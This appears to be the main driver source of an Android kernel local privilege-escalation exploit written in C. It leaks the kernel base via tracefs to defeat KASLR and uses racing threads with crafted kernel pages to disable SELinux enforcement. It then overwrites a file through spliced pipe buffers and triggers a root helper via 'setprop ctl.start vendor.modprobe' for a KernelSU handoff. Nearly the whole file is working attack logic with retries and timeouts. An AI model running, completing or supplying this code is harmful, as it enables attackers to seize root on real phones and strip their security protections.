#include "common.h"

static long phase_elapsed_sec(const struct timespec *start) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return now.tv_sec - start->tv_sec;
}

/* Write shots per phase: the policy's attempt count, bounded by the
 * payload's compiled FOPS retry budget (shared retry state: a landed
 * write sets route_verified and terminates all further shots). */
static int phase_shot_cap(void) {
  int cap = g_exploit_attempts;
  if (APP_FOPS_RETRY_BUDGET > 0 && cap > APP_FOPS_RETRY_BUDGET)
    cap = APP_FOPS_RETRY_BUDGET;
  return cap;
}

static int selinux_write(void) {
  int enforcing = is_selinux_enforcing();
  if (!enforcing) {
    pr_success("Selinux already disabled.\n");
    return 0;
  }
  pr_info("Disabling selinux\n");
  const int cap = phase_shot_cap();
  struct timespec phase_start;
  clock_gettime(CLOCK_MONOTONIC, &phase_start);
  for (int i = 0; i < cap; i++) {
    if (phase_elapsed_sec(&phase_start) > g_attempt_timeout_sec) {
      pr_warning("Selinux phase deadline %ds reached\n", g_attempt_timeout_sec);
      break;
    }
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SELINUX);
    if (!page_base) {
      pr_warning("Preparing kernel page attempt %d: Failed\n", i + 1);
      continue;
    }
ghost_mark("run: selinux attempt %d route start", i + 1);
    run_main_route_threads();
    ghost_mark("run: selinux attempt %d route done verified=%d", i + 1, route_verified);
    if (route_verified) {
      pr_success("Selinux disabled.\n");
      return 0;
    }
    pr_warning("Selinux attempt %d: Failed\n", i + 1);
  }
  pr_error("Failed to disable Selinux\n");
  return 1;
}

static int g_pipe_success_attempt;

static int pipe_flag_write(void) {
  pr_info("Starting pipe_flag phase\n");
  const int cap = phase_shot_cap();
  struct timespec phase_start;
  clock_gettime(CLOCK_MONOTONIC, &phase_start);
  for (int attempt = 0; attempt < cap; attempt++) {
    if (phase_elapsed_sec(&phase_start) > g_attempt_timeout_sec) {
      pr_warning("pipe flag phase deadline %ds reached\n", g_attempt_timeout_sec);
      break;
    }
    if (attempt > 0)
      reset_pipe_attempt();

    pr_info("pipe flag phase: preparing pipe buffer page (attempt %d)\n", attempt + 1);
    pipebuf_page_base = prepare_pipe_buffer_page();
    pr_info("pipe flag phase: pipebuf_page_base=%016zx\n", pipebuf_page_base);
    if (!pipebuf_page_base) {
      pr_warning("pipe flag phase: prepare_pipe_buffer_page failed attempt %d\n", attempt + 1);
      continue;
    }

    int overwrite_fd = open(pipe_overwrite_target(), O_RDONLY);
    if (overwrite_fd < 0) {
      pr_error("pipe flag phase: cannot open %s errno=%d\n",
               pipe_overwrite_target(), errno);
      return 1;
    }
    for (int i = 0; i < PIPE_RECLAIM; i++) {
      off64_t off = 0;
      int ret = splice(overwrite_fd, &off, pipe_fds_reclaim[i][1], NULL, 1, 0);
      if (ret <= 0) {
        pr_error("pipe flag phase: splice failed i=%d ret=%d errno=%d\n",
                 i, ret, errno);
      }
    }
    close(overwrite_fd);

    pin_to_core(CORE);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_PIPE_FLAG);
    if (!page_base) {
      pr_warning("Preparing kernel page attempt %d: Failed\n", attempt + 1);
      continue;
    }

ghost_mark("run: pipe attempt %d route start", attempt + 1);
    run_main_route_threads();
    ghost_mark("run: pipe attempt %d route done verified=%d", attempt + 1, route_verified);

    if (route_verified) {
      pr_info("pipe flag phase: overwrite succeeded on attempt %d\n", attempt + 1);
      g_pipe_success_attempt = attempt + 1;
      break;
    }
    pr_warning("pipe flag phase: attempt %d failed\n", attempt + 1);
  }

  if (!route_verified) {
    pr_warning("pipe flag phase: all attempts exhausted\n");
    if (pipe_prepare_child > 0) {
      kill(pipe_prepare_child, SIGKILL);
      waitpid(pipe_prepare_child, NULL, 0);
      pipe_prepare_child = -1;
    }
    return 1;
  }

  pr_info("pipe flag phase: running setprop\n");
  ghost_mark("run: pipe overwrite verified; setprop ctl.start vendor.modprobe");
  system("setprop ctl.start vendor.modprobe");
  ghost_mark("run: setprop returned (root stage is async from here)");

  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }
  return 0;
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  set_unbuffer();
  set_limit();
  pin_to_core(CORE);
  init_p0_from_env();
  policy_init_from_env();

  ghost_mark("run: exploit start");
  ghost_mark("run: policy attempts=%d timeout=%ds p0timeout=%ds budget=%d tracefs=%d physalias=%d p0oracle=%d",
      g_exploit_attempts, g_attempt_timeout_sec, g_p0_timeout_sec,
      APP_FOPS_RETRY_BUDGET, APP_TRACEFS_SLIDE, APP_TRACEFS_PHYS_ALIAS_DATA,
      APP_PHYS_P0_ORACLE);
#ifdef ANDROID_TARGET
  if (!slide_leak_kernel_base()) {
    pr_error("tracefs kaslr leak failed\n");
    ghost_mark("run: slide leak FAILED");
    return 1;
  }
  ghost_mark("run: slide leak ok");
  pr_info("tracefs kaslr leak done.\n");
  if (getenv("SLIDE_ONLY")) {
    pr_success("SLIDE_ONLY set; stopping before selinux write\n");
    return 0;
  }
#endif

  atomic_store(&current_phase, PHASE_SELINUX);
  if (!getenv("SKIP_SELINUX")) {
    if (selinux_write()) {
      pr_info("Selinux overwrite failed.\n");
      ghost_mark("run: selinux phase FAILED");
      return 1;
    }
    ghost_mark("run: selinux phase ok");
    /* Fail-safe: the phase's own verify reads /sys/fs/selinux/enforce and
     * treats an unreadable node as "disabled" — re-check with a gap and
     * abort before the pipe phase rather than panic on a bad state. */
    sleep(1);
    if (is_selinux_enforcing()) {
      pr_error("selinux still enforcing after verified write; aborting\n");
      ghost_mark("run: selinux post-verify FAILED");
      return 1;
    }
  } else {
    pr_info("SKIP_SELINUX set; going straight to pipe flag\n");
  }
  if (getenv("SELINUX_ONLY")) {
    pr_success("SELINUX_ONLY set; stopping before pipe flag\n");
    return 0;
  }
  atomic_store(&current_phase, PHASE_PIPE_FLAG);
  int pipe_rc = pipe_flag_write();
  ghost_mark("run: pipe flag rc=%d", pipe_rc);
  /* App success contract: the run log must carry "exploit completed" and
   * (later, appended by the root helper after the KSU handoff) a
   * "done=1 root=1" summary. */
  if (pipe_rc == 0)
    pr_success("exploit completed attempt=%d/%d\n",
        g_pipe_success_attempt, phase_shot_cap());
  else
    pr_error("exploit failed after %d independent attempts\n",
        phase_shot_cap());
  return pipe_rc;
}
